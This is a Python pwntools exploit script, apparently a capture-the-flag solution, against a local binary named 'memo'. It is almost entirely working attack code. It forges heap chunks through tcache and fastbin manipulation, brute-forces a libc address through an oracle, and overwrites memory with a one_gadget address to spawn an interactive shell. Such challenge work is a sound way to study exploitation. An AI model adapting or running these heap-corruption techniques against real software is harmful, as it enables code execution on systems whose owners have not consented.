#!/usr/bin/env python2
from pwn import *
from IPython import embed

context.arch = 'amd64'

r = process('./memo')

key = flat([
    0, 0x21,
    0, 0,
    0, 0x21,
    #0, 0x7971,
    #0, 0x11,
    #0, 0xffffffffffffffe1,
    #0x0000000400000001,0xb1
])
cnt = 0

def add(sz, off, data):
    global cnt
    r.sendlineafter('> ', '1')
    r.sendlineafter('key...', key)
    r.sendlineafter('> ', str(sz))
    if sz == -1:
        return
    r.sendlineafter('> ', str(off))
    if sz > off:
        r.sendafter('> ', data)
        cnt += 1

def delete(idx, bad=0):
    if bad:
        r.sendafter('> ', bad)
    else:
        r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))
    x = r.recvline()
    if 'not' in x:
        return False
    return True

def change_key(new_key):
    global key
    key = new_key
    r.sendlineafter('> ', '9')
    r.sendafter('key...', key)

def guess(guess_key):
    r.sendlineafter('> ', '1')
    r.sendlineafter('key...', guess_key)
    x = r.recvline()
    return x
    if 'NOT' in x:
        return False
    return True


#r.sendlineafter('>', '100000000')
r.sendlineafter('>', '10')
r.sendafter('key...', key)

# fill tcache
for i in range(7):
    add(0x18, 0x88, 'a')
# fastbin
#add(0x18, 0x88, 'a')

change_key(flat(0, 0x21))
# fastbin in the key
delete(2, '2'+'\xff'*7+flat(-1))
# consolidate: fastbin -> smallbin
change_key(flat(0, 0x21))
add(0x448, 0x500, 'a')
# disable calloc
change_key(flat(0, 0x22))
add(0x18, 8, '\x00'*8)
# leak upper part of libc
change_key('A'*16+'\xb1')
libc = 0
#for i in range(0x7ffb, 0x6fff, -1):
for i in range(0x7d00, 0x8000):
    x = delete(i, '2'+'\xff'*10+flat(-5))
    if x:
        print 'upper libc:', hex(i)
        libc = i<<32
        break
print 'libc:', hex(libc)

#g_libc = libc | (0<<12) | 0xcb0
#x = guess('a'*16+flat(g_libc))
#r.interactive()
#raw_input("@")
#for i in range(2):
for pos in range(3, 0, -1):
    change_key('a'*16+'a'*pos)
    for i in range(256):
        if i%2 == 0:
            change_key('a\x00')
            add(-1, 0, 'a')
            change_key('aa')
        g_libc = libc | (i<<((pos)*8)) | u64(('a'*pos).ljust(8, '\x00'))
        x = guess('a'*16+flat(g_libc))
        #if x:
        if 'NOT' not in x:
            libc = g_libc & u64(('\x00'*pos).ljust(8, '\xff'))
            #print 'libc:', hex(libc)
            r.sendlineafter('> ', '-1')
            break
        #if i%100 == 0:
            #print i, hex(g_libc)
    # restore address
    if pos != 1:
        change_key(flat(0, 0x21))
        delete(cnt)
        add(0x448, 0x500, 'a')
        change_key(flat(0, 0x22))
        add(0x18, 8, '\x00')

libc -= 0x3ebc00
print 'libc:', hex(libc)


change_key(flat(0, 0x21))
add(0x448, 0, 'a')
delete(cnt-1)
# unsorted bin
delete(cnt)

change_key(flat(0, 0x451))
add(0x448, 0x98, flat(0x4f322+libc, [0]*10))
r.sendlineafter('>', '0')



r.interactive()
